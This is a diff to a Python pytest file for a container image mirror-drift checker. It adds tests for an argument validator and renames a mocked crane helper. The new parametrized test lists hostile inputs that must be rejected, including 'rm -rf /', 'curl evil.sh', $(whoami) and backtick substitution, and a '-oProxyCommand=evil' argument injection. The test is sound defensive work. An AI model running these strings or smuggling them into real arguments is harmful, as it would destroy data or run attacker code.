@@ -16,10 +16,50 @@ import pytest
 sys.path.insert(0, str(Path(__file__).parent.parent / "scripts"))
 import check_mirror_drift  # noqa: E402
 from check_mirror_drift import (  # noqa: E402
+    UnsafeArgumentError,
     diff_tags,
     is_artifact_tag,
     parse_catalog,
+    validate_args,
 )
+
+# ---------------------------------------------------------------------------
+# validate_args: nothing reaches the process boundary unvalidated
+# ---------------------------------------------------------------------------
+
+
+class TestValidateArgs:
+    def test_ordinary_reference_passes(self):
+        args = ["digest", "dhi.io/python:3.14-debian13"]
+        assert validate_args(args) == args
+
+    def test_digest_reference_passes(self):
+        args = ["digest", "gcr.io/distroless/static-debian12@sha256:" + "a" * 64]
+        assert validate_args(args) == args
+
+    def test_flags_pass_through(self):
+        args = ["digest", "dhi.io/python:3.14", "--platform", "linux/amd64"]
+        assert validate_args(args) == args
+
+    @pytest.mark.parametrize(
+        "hostile",
+        [
+            "dhi.io/python; rm -rf /",
+            "dhi.io/python && curl evil.sh",
+            "dhi.io/python$(whoami)",
+            "dhi.io/python|tee",
+            "dhi.io/python\nnewline",
+            "dhi.io/python with space",
+            "`backtick`",
+            "-oProxyCommand=evil",
+            "",
+        ],
+    )
+    def test_hostile_values_are_rejected(self, hostile: str):
+        """A catalog is a YAML file any PR can edit; treat its values as input."""
+        with pytest.raises(UnsafeArgumentError):
+            validate_args(["digest", hostile])
+
 
 # ---------------------------------------------------------------------------
 # is_artifact_tag: Cosign artifacts must not be reported as orphaned images
@@ -178,25 +218,25 @@ class TestCheckPins:
     def test_unpinned_entries_are_skipped(self, monkeypatch):
         """No pin means nothing to verify; crane must not even be called."""
         monkeypatch.setattr(
-            check_mirror_drift, "crane", lambda a: pytest.fail("crane called")
+            check_mirror_drift, "run_crane", lambda a: pytest.fail("crane called")
         )
         assert check_mirror_drift.check_pins([self._entry(None)]) == []
 
     def test_pin_matching_index_digest_is_clean(self, monkeypatch):
-        monkeypatch.setattr(check_mirror_drift, "crane", lambda a: PIN)
+        monkeypatch.setattr(check_mirror_drift, "run_crane", lambda a: PIN)
         assert check_mirror_drift.check_pins([self._entry(PIN)]) == []
 
     def test_pin_matching_platform_digest_is_clean(self, monkeypatch):
         """The catalog does not record which digest form was pinned."""
         monkeypatch.setattr(
             check_mirror_drift,
-            "crane",
+            "run_crane",
             lambda args: PIN if "--platform" in args else OTHER,
         )
         assert check_mirror_drift.check_pins([self._entry(PIN)]) == []
 
     def test_pin_matching_neither_is_reported(self, monkeypatch):
-        monkeypatch.setattr(check_mirror_drift, "crane", lambda a: OTHER)
+        monkeypatch.setattr(check_mirror_drift, "run_crane", lambda a: OTHER)
         drifted = check_mirror_drift.check_pins([self._entry(PIN)])
         assert len(drifted) == 1
         img_id, pin, resolved = drifted[0]
@@ -206,5 +246,5 @@ class TestCheckPins:
 
     def test_unresolvable_source_is_not_reported_as_drift(self, monkeypatch):
         """A failed registry query is missing evidence, not evidence of drift."""
-        monkeypatch.setattr(check_mirror_drift, "crane", lambda a: None)
+        monkeypatch.setattr(check_mirror_drift, "run_crane", lambda a: None)
         assert check_mirror_drift.check_pins([self._entry(PIN)]) == []
